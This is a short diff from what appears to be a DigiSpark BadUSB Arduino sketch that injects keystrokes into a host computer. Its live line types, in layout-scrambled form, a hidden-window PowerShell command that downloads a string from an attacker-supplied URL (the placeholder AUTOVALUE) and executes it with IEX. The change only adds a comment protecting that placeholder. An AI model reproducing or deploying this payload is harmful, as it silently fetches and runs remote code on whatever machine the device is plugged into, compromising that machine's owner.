@@ -47,7 +47,7 @@ void loop() {
 //  DigiKeyboard.delay(500);
 //  DigiKeyboard.println("stqrt C.>Zindozs>Syste;#@>Ribbons<scr >s");
 //  DigiKeyboard.delay(250);
-    DigiKeyboard.println("pozershell 6zindozstyle hidden 3IEX 5Nez6Object Net<ZebClient-<DoznloqdString54AUTOVALUE4-3");
+    DigiKeyboard.println("pozershell 6zindozstyle hidden 3IEX 5Nez6Object Net<ZebClient-<DoznloqdString54AUTOVALUE4-3"); // Do not delete "AUTOVALUE", it is a index.
 //  DigiKeyboard.delay(250);
 //  DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT); // Save the file and return to cmd shell use delay of 500ms
 //  DigiKeyboard.sendKeyStroke(KEY_ENTER);
